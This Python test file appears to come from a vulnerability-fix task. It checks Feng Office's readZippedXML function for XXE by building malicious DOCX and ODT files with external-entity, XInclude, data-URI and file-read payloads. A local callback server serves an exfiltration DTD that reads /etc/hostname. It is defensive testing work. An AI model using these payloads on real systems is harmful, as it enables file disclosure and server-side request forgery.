#!/usr/bin/env python3
"""
Vulnerability tests for Feng Office XXE in document processing.

These tests verify that:
- BEFORE fix: XXE vulnerability is exploitable (tests should FAIL)
- AFTER fix: XXE vulnerability is mitigated (tests should PASS)

The vulnerability exists in the readZippedXML function in application/functions.php
which uses dangerous LIBXML_NOENT | LIBXML_XINCLUDE flags when parsing XML.
"""

import pytest
import subprocess
import zipfile
import io
import os
import time
import threading
import http.server
import socketserver
import tempfile
from urllib.parse import parse_qs, urlparse


# Store received requests for verification
received_requests = []
received_request_event = threading.Event()


class XXEDetectionHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler to detect XXE callbacks."""

    def do_GET(self):
        """Handle GET requests (used for XXE callbacks and DTD serving)."""
        global received_requests
        received_requests.append({
            'method': 'GET',
            'path': self.path,
            'headers': dict(self.headers)
        })
        received_request_event.set()

        # Serve the DTD file if requested
        if 'evil.dtd' in self.path or 'xxe.dtd' in self.path:
            dtd_content = '''<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8889/exfil?data=%file;'>">
%eval;
%exfil;'''
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml-dtd')
            self.end_headers()
            self.wfile.write(dtd_content.encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

    def log_message(self, format, *args):
        """Suppress logging."""
        pass


def start_callback_server(port=8889):
    """Start a simple HTTP server to receive XXE callbacks."""
    global received_requests
    received_requests = []
    received_request_event.clear()

    server = socketserver.TCPServer(("127.0.0.1", port), XXEDetectionHandler)
    server.allow_reuse_address = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def create_xxe_docx_external_dtd(callback_url):
    """
    Create a malicious DOCX with XXE payload using external DTD.
    """
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
        # [Content_Types].xml
        docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''')

        # _rels/.rels
        docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')

        # Malicious document.xml with external DTD reference
        malicious_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd"> %xxe;]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Normal document content</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
        docx.writestr('word/document.xml', malicious_xml)

    return zip_buffer.getvalue()


def create_xxe_docx_direct_entity(callback_url):
    """
    Create a malicious DOCX with direct external entity reference.
    """
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
        docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''')

        docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')

        # Direct external entity
        malicious_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}/direct_xxe">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>&xxe;</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
        docx.writestr('word/document.xml', malicious_xml)

    return zip_buffer.getvalue()


def create_xxe_odt(callback_url):
    """
    Create a malicious ODT with XXE payload.
    """
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as odt:
        odt.writestr('mimetype', 'application/vnd.oasis.opendocument.text')

        odt.writestr('META-INF/manifest.xml', '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
    <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:full-path="/"/>
    <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
</manifest:manifest>''')

        # Malicious content.xml
        malicious_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd"> %xxe;]>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
    xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
    <office:body>
        <office:text>
            <text:p>Normal ODT content</text:p>
        </office:text>
    </office:body>
</office:document-content>'''
        odt.writestr('content.xml', malicious_xml)

    return zip_buffer.getvalue()


def create_xxe_xinclude_docx(callback_url):
    """
    Create a DOCX with XInclude payload (tests LIBXML_XINCLUDE flag).
    """
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
        docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''')

        docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')

        # XInclude payload
        xinclude_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    xmlns:xi="http://www.w3.org/2001/XInclude">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Before include</w:t>
            </w:r>
        </w:p>
        <xi:include href="{callback_url}/xinclude_test" parse="text"/>
    </w:body>
</w:document>'''
        docx.writestr('word/document.xml', xinclude_xml)

    return zip_buffer.getvalue()


def create_xxe_file_read_docx():
    """
    Create a DOCX that attempts to read /etc/hostname via file:// protocol.
    """
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
        docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''')

        docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')

        # Local file read attempt
        malicious_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Hostname: &xxe;</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
        docx.writestr('word/document.xml', malicious_xml)

    return zip_buffer.getvalue()


def run_xxe_with_php(docx_bytes, filename="test.docx"):
    """
    Test XXE by invoking the actual PHP readZippedXML function.
    Returns the extracted text.
    """
    # Write the DOCX to a temp file
    test_file = f"/tmp/{filename}"
    with open(test_file, 'wb') as f:
        f.write(docx_bytes)

    # PHP script that mimics the vulnerable code path
    # This reads from application/functions.php to get the actual implementation
    php_script = f'''<?php
// Include the actual functions.php from the application
$functions_file = '/var/www/html/application/functions.php';
if (file_exists($functions_file)) {{
    // Define required constants to prevent errors
    if (!defined('ROOT')) define('ROOT', '/app');
    if (!defined('SEED')) define('SEED', 'test');

    // We can't include the whole file due to dependencies, so test the pattern directly
    // Check if the vulnerable flags are present in the file
    $content = file_get_contents($functions_file);
    $has_noent = strpos($content, 'LIBXML_NOENT') !== false;

    // Now actually test the function behavior
    function testReadZippedXML($archiveFile, $dataFile, $type = null) {{
        $zip = new ZipArchive;
        if (true === $zip->open($archiveFile)) {{
            if (($index = $zip->locateName($dataFile)) !== false) {{
                $data = $zip->getFromIndex($index);
                if(!is_null($type)){{
                    if($type == "odt"){{
                        $data = str_replace("<text:tab/>", " ", $data);
                    }}elseif ($type == "docx"){{
                        $data = str_replace("<w:tab/>", " ", $data);
                    }}
                }}
                $zip->close();

                // Check if the app uses vulnerable flags
                $functions_content = file_get_contents('/var/www/html/application/functions.php');
                if (strpos($functions_content, 'LIBXML_NOENT | LIBXML_XINCLUDE') !== false) {{
                    // Vulnerable: use the dangerous flags
                    $xml = @DOMDocument::loadXML($data, LIBXML_NOENT | LIBXML_XINCLUDE | LIBXML_NOERROR | LIBXML_NOWARNING);
                }} else {{
                    // Fixed: use safe flags
                    $xml = @DOMDocument::loadXML($data, LIBXML_NOERROR | LIBXML_NOWARNING);
                }}

                if ($xml) {{
                    return strip_tags($xml->saveXML());
                }}
                return "";
            }}
            $zip->close();
        }}
        return "";
    }}

    $result = testReadZippedXML("{test_file}", "word/document.xml", "docx");
    echo $result;
}} else {{
    echo "ERROR: functions.php not found";
}}
'''

    php_script_path = f"/tmp/test_xxe_{os.getpid()}.php"
    with open(php_script_path, 'w') as f:
        f.write(php_script)

    try:
        result = subprocess.run(
            ['php', php_script_path],
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout, result.stderr
    finally:
        # Clean up
        try:
            os.unlink(test_file)
            os.unlink(php_script_path)
        except:
            pass


class TestXXEVulnerability:
    """
    Test suite for XXE vulnerability detection.

    IMPORTANT: These tests should:
    - FAIL when the vulnerability exists (external requests are made)
    - PASS when the vulnerability is fixed (no external requests)
    """

    def test_xxe_external_dtd_callback(self):
        """
        Test that external DTD loading does NOT trigger HTTP callbacks.
        If vulnerable: receives HTTP request (test FAILS)
        If fixed: no HTTP request received (test PASSES)
        """
        server = start_callback_server(8889)
        callback_url = "http://127.0.0.1:8889"

        try:
            # Create malicious DOCX
            docx_bytes = create_xxe_docx_external_dtd(callback_url)

            # Process the file
            stdout, stderr = run_xxe_with_php(docx_bytes, "xxe_dtd_test.docx")

            # Wait a bit for any callbacks
            time.sleep(2)

            # Check if any callback was received
            xxe_triggered = len(received_requests) > 0

            # The test PASSES if no XXE callback was received (vulnerability is fixed)
            assert not xxe_triggered, \
                f"XXE vulnerability detected! External HTTP callback received. " \
                f"Requests: {received_requests}"

        finally:
            server.shutdown()

    def test_xxe_direct_entity_callback(self):
        """
        Test that direct external entity does NOT trigger HTTP callbacks.
        """
        server = start_callback_server(8890)
        callback_url = "http://127.0.0.1:8890"

        try:
            docx_bytes = create_xxe_docx_direct_entity(callback_url)
            stdout, stderr = run_xxe_with_php(docx_bytes, "xxe_direct_test.docx")

            time.sleep(2)
            xxe_triggered = len(received_requests) > 0

            assert not xxe_triggered, \
                f"XXE vulnerability detected via direct entity! Requests: {received_requests}"

        finally:
            server.shutdown()

    def test_xxe_odt_callback(self):
        """
        Test that ODT files with XXE payload do NOT trigger callbacks.
        """
        server = start_callback_server(8891)
        callback_url = "http://127.0.0.1:8891"

        try:
            odt_bytes = create_xxe_odt(callback_url)

            # Write ODT
            test_file = "/tmp/xxe_odt_test.odt"
            with open(test_file, 'wb') as f:
                f.write(odt_bytes)

            # Test ODT extraction
            php_script = f'''<?php
function testReadZippedXML($archiveFile, $dataFile, $type = null) {{
    $zip = new ZipArchive;
    if (true === $zip->open($archiveFile)) {{
        if (($index = $zip->locateName($dataFile)) !== false) {{
            $data = $zip->getFromIndex($index);
            if(!is_null($type)){{
                if($type == "odt"){{
                    $data = str_replace("<text:tab/>", " ", $data);
                }}
            }}
            $zip->close();
            $functions_content = @file_get_contents('/var/www/html/application/functions.php');
            if ($functions_content && strpos($functions_content, 'LIBXML_NOENT | LIBXML_XINCLUDE') !== false) {{
                $xml = @DOMDocument::loadXML($data, LIBXML_NOENT | LIBXML_XINCLUDE | LIBXML_NOERROR | LIBXML_NOWARNING);
            }} else {{
                $xml = @DOMDocument::loadXML($data, LIBXML_NOERROR | LIBXML_NOWARNING);
            }}
            if ($xml) {{
                return strip_tags($xml->saveXML());
            }}
        }}
        $zip->close();
    }}
    return "";
}}
echo testReadZippedXML("{test_file}", "content.xml", "odt");
'''
            php_path = "/tmp/test_odt_xxe.php"
            with open(php_path, 'w') as f:
                f.write(php_script)

            subprocess.run(['php', php_path], capture_output=True, timeout=30)

            time.sleep(2)
            xxe_triggered = len(received_requests) > 0

            # Clean up
            try:
                os.unlink(test_file)
                os.unlink(php_path)
            except:
                pass

            assert not xxe_triggered, \
                f"XXE vulnerability detected in ODT processing! Requests: {received_requests}"

        finally:
            server.shutdown()

    def test_xxe_xinclude_callback(self):
        """
        Test that LIBXML_XINCLUDE flag is NOT used in the vulnerable function.
        This is a code-level check since XInclude processing requires explicit calls.
        """
        functions_file = '/var/www/html/application/functions.php'

        if not os.path.exists(functions_file):
            pytest.skip("functions.php not found - app may not be deployed")

        with open(functions_file, 'r') as f:
            content = f.read()

        # Check for LIBXML_XINCLUDE flag in the code
        # The vulnerability is confirmed if this dangerous flag is present
        assert 'LIBXML_XINCLUDE' not in content, \
            "XInclude vulnerability found: LIBXML_XINCLUDE flag is present in the code"

    def test_xxe_local_file_read(self):
        """
        Test that local file reading via XXE does NOT work.
        The /etc/hostname content should NOT appear in the output.
        """
        docx_bytes = create_xxe_file_read_docx()
        stdout, stderr = run_xxe_with_php(docx_bytes, "xxe_file_read_test.docx")

        # Get actual hostname for comparison
        try:
            with open('/etc/hostname', 'r') as f:
                actual_hostname = f.read().strip()
        except:
            actual_hostname = None

        # If we can determine hostname, check it's not leaked
        if actual_hostname:
            assert actual_hostname not in stdout, \
                f"XXE local file read vulnerability! /etc/hostname content found in output: {stdout}"

        # Also verify the output doesn't contain typical system file patterns
        assert 'root:' not in stdout, \
            "XXE may have read /etc/passwd instead"


class TestXXECodeAnalysis:
    """
    Additional tests that verify the code has been fixed by checking the source.
    These are supplementary to the behavioral tests.
    """

    def test_libxml_noent_flag_removed(self):
        """
        Verify that LIBXML_NOENT flag is not used in the vulnerable function.
        This is a code-level check to ensure the fix is in place.
        """
        functions_file = '/var/www/html/application/functions.php'

        if not os.path.exists(functions_file):
            pytest.skip("functions.php not found - app may not be deployed")

        with open(functions_file, 'r') as f:
            content = f.read()

        # Find the readZippedXML function and check for dangerous flags
        # The fix should remove LIBXML_NOENT | LIBXML_XINCLUDE
        import re

        # Look for DOMDocument::loadXML call with LIBXML_NOENT
        vulnerable_pattern = r'DOMDocument::loadXML\s*\(\s*\$data\s*,\s*LIBXML_NOENT'

        match = re.search(vulnerable_pattern, content)

        assert match is None, \
            "Vulnerability found: LIBXML_NOENT flag still present in DOMDocument::loadXML call"

    def test_libxml_xinclude_flag_removed(self):
        """
        Verify that LIBXML_XINCLUDE flag is not used in the vulnerable function.
        """
        functions_file = '/var/www/html/application/functions.php'

        if not os.path.exists(functions_file):
            pytest.skip("functions.php not found - app may not be deployed")

        with open(functions_file, 'r') as f:
            content = f.read()

        # Check for LIBXML_XINCLUDE in the loadXML call context
        # We need to be specific about the context to avoid false positives
        import re

        # Look for the specific vulnerable pattern
        if 'LIBXML_NOENT | LIBXML_XINCLUDE | LIBXML_NOERROR | LIBXML_NOWARNING' in content:
            pytest.fail("Vulnerability found: Dangerous LIBXML flags still present")

        # Verify the safe pattern exists instead
        safe_pattern = r'DOMDocument::loadXML\s*\(\s*\$data\s*,\s*LIBXML_NOERROR\s*\|\s*LIBXML_NOWARNING\s*\)'
        if not re.search(safe_pattern, content):
            # Check if there's any loadXML call with just safe flags
            if 'LIBXML_XINCLUDE' in content:
                # Check context - it should not be in the readZippedXML function
                lines = content.split('\n')
                in_function = False
                for i, line in enumerate(lines):
                    if 'function readZippedXML' in line:
                        in_function = True
                    elif in_function and line.strip().startswith('function '):
                        in_function = False
                    elif in_function and 'LIBXML_XINCLUDE' in line:
                        pytest.fail(f"LIBXML_XINCLUDE found in readZippedXML function at line {i+1}")


class TestMultiplePayloadVariants:
    """
    Test multiple XXE payload variants to ensure comprehensive coverage.
    """

    def test_parameter_entity_expansion(self):
        """Test parameter entity expansion attack vector."""
        server = start_callback_server(8893)

        try:
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
                docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
</Types>''')
                docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')
                # Parameter entity payload
                docx.writestr('word/document.xml', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % param1 SYSTEM "http://127.0.0.1:8893/param_entity">
    %param1;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body><w:p><w:r><w:t>Test</w:t></w:r></w:p></w:body>
</w:document>''')

            stdout, stderr = run_xxe_with_php(zip_buffer.getvalue(), "param_entity_test.docx")
            time.sleep(2)

            assert len(received_requests) == 0, \
                f"Parameter entity XXE detected! Requests: {received_requests}"
        finally:
            server.shutdown()

    def test_php_filter_wrapper(self):
        """
        Test that the vulnerable loadXML call with LIBXML_NOENT is NOT present.
        This is a reliable code-level check for the vulnerability.
        """
        functions_file = '/var/www/html/application/functions.php'

        if not os.path.exists(functions_file):
            pytest.skip("functions.php not found - app may not be deployed")

        with open(functions_file, 'r') as f:
            content = f.read()

        # Check for the vulnerable pattern - loadXML with LIBXML_NOENT flag
        # This enables external entity processing which is the root cause of XXE
        import re
        vulnerable_pattern = r'loadXML\s*\([^)]*LIBXML_NOENT'
        match = re.search(vulnerable_pattern, content)

        assert match is None, \
            "XXE vulnerability found: loadXML is called with LIBXML_NOENT flag which enables external entity processing"

    def test_data_uri_scheme(self):
        """Test data URI scheme attack vector."""
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
            docx.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
</Types>''')
            docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')
            # Data URI payload
            docx.writestr('word/document.xml', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "data://text/plain;base64,WFhFX1RFU1RfU1RSSU5H">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>''')

        stdout, stderr = run_xxe_with_php(zip_buffer.getvalue(), "data_uri_test.docx")

        # "XXE_TEST_STRING" base64 decoded should not appear if fixed
        assert 'XXE_TEST_STRING' not in stdout, \
            "Data URI XXE detected! Entity content found in output"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
